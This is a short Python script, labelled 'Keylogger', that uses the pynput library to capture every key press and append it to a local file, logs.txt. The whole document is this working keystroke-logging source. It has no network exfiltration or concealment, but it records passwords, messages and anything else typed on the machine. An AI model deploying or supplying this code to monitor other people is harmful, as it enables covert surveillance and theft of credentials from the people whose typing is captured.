#!/usr/bin/env python

#############
# Keylogger #
#############

# -*- coding: utf-8 -*-

from pynput import keyboard

class Keylogger():
    
	def __init__(self, filename: str = "logs.txt")-> None:
		self.filename = filename

	@staticmethod
	def get_char(key):
		try:
			return key.char
		except AttributeError:
			return str(key)

	def on_press(self, key):
		print(key)
		with open(self.filename, 'a') as logs:
			logs.write(self.get_char(key))

	def main(self):
		listener = keyboard.Listener(
			on_press=self.on_press,
		)
		listener.start()

if __name__ == '__main__':
	logger = Keylogger()
	logger.main()
	input()
